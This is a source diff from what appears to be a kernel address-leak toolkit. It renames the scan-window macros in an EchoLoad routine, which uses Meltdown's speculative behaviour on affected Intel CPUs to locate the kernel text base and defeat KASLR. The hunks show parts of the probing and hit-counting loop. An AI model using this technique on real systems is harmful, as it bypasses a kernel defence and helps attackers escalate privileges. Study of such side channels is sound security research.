@@ -115,11 +115,12 @@
  * all verification sweeps exactly (entrybleed-style unanimity check). */
 #define ECHOLOAD_VERIFY 3
 
-/* Scan window: uses api.h defines (KERNEL_VIRT_TEXT_MIN,
- * KERNEL_VIRT_TEXT_MAX). */
+/* Scan window: uses api.h defines (VIRT_TEXT_PLAUSIBLE_MIN,
+ * VIRT_TEXT_PLAUSIBLE_MAX). */
 #define SCAN_STEP (KASLR_VIRT_ALIGN)
 #define SCAN_SLOTS                                                             \
-  ((unsigned long)(KERNEL_VIRT_TEXT_MAX - KERNEL_VIRT_TEXT_MIN) / SCAN_STEP)
+  ((unsigned long)(VIRT_TEXT_PLAUSIBLE_MAX - VIRT_TEXT_PLAUSIBLE_MIN) /        \
+   SCAN_STEP)
 
 KASLD_EXPLAIN("EchoLoad exploits the Meltdown vulnerability's zero-return "
               "behavior: on affected Intel CPUs, a speculative kernel memory "
@@ -171,8 +172,8 @@ static void segfault_handler(int signum) {
  * EchoLoad single sweep
  * =========================================================================
  *
- * Scans [KERNEL_VIRT_TEXT_MIN, KERNEL_VIRT_TEXT_MAX) and returns the lowest
- * confirmed mapped address, or 0 if nothing was found.
+ * Scans [VIRT_TEXT_PLAUSIBLE_MIN, VIRT_TEXT_PLAUSIBLE_MAX) and returns the
+ * lowest confirmed mapped address, or 0 if nothing was found.
  *
  * Uses interleaved iteration: visit every candidate address once per
  * iteration, repeat ECHOLOAD_ITERATIONS times, and accumulate per-slot
@@ -184,7 +185,7 @@ static unsigned long echoload_sweep(int use_tsx) {
   memset(hits, 0, sizeof(hits));
 
   for (int iter = 0; iter < ECHOLOAD_ITERATIONS + ECHOLOAD_WARMUP; iter++) {
-    volatile char *buffer = (volatile char *)KERNEL_VIRT_TEXT_MIN;
+    volatile char *buffer = (volatile char *)VIRT_TEXT_PLAUSIBLE_MIN;
 
     for (unsigned long slot = 0; slot < SCAN_SLOTS; slot++) {
       flush(probe);
@@ -232,7 +233,7 @@ static unsigned long echoload_sweep(int use_tsx) {
                ECHOLOAD_HIT_THRESHOLD, ECHOLOAD_ITERATIONS);
     for (unsigned long slot = 0; slot < SCAN_SLOTS; slot++)
       if (hits[slot])
-        kasld_info("#   0x%lx %d%s", KERNEL_VIRT_TEXT_MIN + slot * SCAN_STEP,
+        kasld_info("#   0x%lx %d%s", VIRT_TEXT_PLAUSIBLE_MIN + slot * SCAN_STEP,
                    hits[slot],
                    hits[slot] >= ECHOLOAD_HIT_THRESHOLD ? "  <- over threshold"
                                                         : "");
@@ -241,7 +242,7 @@ static unsigned long echoload_sweep(int use_tsx) {
   /* Return the lowest address above the hit threshold */
   for (unsigned long slot = 0; slot < SCAN_SLOTS; slot++) {
     if (hits[slot] >= ECHOLOAD_HIT_THRESHOLD)
-      return KERNEL_VIRT_TEXT_MIN + slot * SCAN_STEP;
+      return VIRT_TEXT_PLAUSIBLE_MIN + slot * SCAN_STEP;
   }
   return 0;
 }
